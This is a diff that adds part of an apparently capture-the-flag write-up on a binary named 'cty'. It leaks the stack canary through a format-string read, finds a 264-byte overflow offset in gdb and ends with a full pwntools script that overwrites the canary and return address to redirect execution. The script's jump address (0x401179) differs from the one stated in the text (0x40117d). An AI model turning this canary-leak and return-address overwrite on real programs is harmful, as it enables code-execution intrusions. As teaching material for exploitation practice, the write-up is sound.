@@ -143,4 +143,89 @@ kali@kali:~/ct-y$ python3 t1.py
 48 - b'AAAA 401080'
 49 - b'AAAA 7ffe0446bea0'
 ```
+Out starting with **0x7f** correspond to libc memory addresses. Canary usually ends with **00**.
+In 39th, we see one canary possible address.   
+To calculate if the canary corresponds with output 39 of **format string**, we use gdb again:
+
+```
+kali@kali:~/ct-y$ gdb cty
+GNU gdb (Debian 9.2-1) 9.2
+gef➤  disass main
+Dump of assembler code for function main:
+0x00000000004011d9 <+0>:     push   rbp
+.....
+0x0000000000401260 <+135>:   mov    rdx,QWORD PTR [rbp-0x8]
+0x0000000000401264 <+139>:   sub    rdx,QWORD PTR fs:0x28
+0x000000000040126d <+148>:   je     0x401274 <main+155>
+0x000000000040126f <+150>:   call   0x401040 <__stack_chk_fail@plt>
+...
+End of assembler dump.
+gef➤  b *main+139
+Breakpoint 1 at 0x401264
+gef➤  r
+Starting program: /home/kali/ct-y/cty 
+%39$lx
+d2f524612effb00     //Canary value at 39th
+A
+A
+Breakpoint 1, 0x0000000000401264 in main ()
+.....
+gef➤  p $rdx
+$2 = 0xd2f524612effb00  //Canary value at the rdx. They match
+````
+Perfect, we get the location at 39.
+
+### Padding
+Now we calculate the padding we use to overwrite the canary and then the return address.  
+Breakpoint set at the canary check point again: *main+139
+```
+gef➤  pattern create 300
+[+] Generating a pattern of 300 bytes
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
+gef➤  r
+Starting program: /home/kali/ct-y/cty 
+a
+a
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
+
+Breakpoint 1, 0x0000000000401264 in main ()
+gef➤  p/x $rdx               //rdx overload with created pattern, use that to find the offset
+$3 = 0x6261616161616169
+gef➤  pattern offset 0x6261616161616169
+[+] Searching '0x6261616161616169'
+[+] Found at offset 264 (little-endian search) likely
+```
+We found the offset to **canary** likely to be **264**. So we create the payload to be like this:
+```
+"A"*264+CANARY+"A"*8+ ROP
+```
+**ROP** is the function jump address. In this case, would be the address of **void runIntoTheCty()**.
+We can find it using GDB. The address is **0x40117d**
+```
+gef➤  b runIntoTheCty
+Breakpoint 2 at 0x40117d
+```
+Thus we craft the python program like this:
+```
+#!/usr/bin/evn python3
+from pwn import *
+
+e = ELF('./cty')
+io = e.process()
+gdb.attach(io)
+io.sendline('%39$lx')
+leak = io.recvline()
+canary = int(leak.strip(),16)
+log.info("Canary: %s" % (hex(canary)))
+
+run = 0x401179
+pl = b'A'*8
+payload = b'A'*264 + p64(canary) + pl + p64(run)
+io.sendline(payload)
+io.interactive()
+```
+
+
+
 
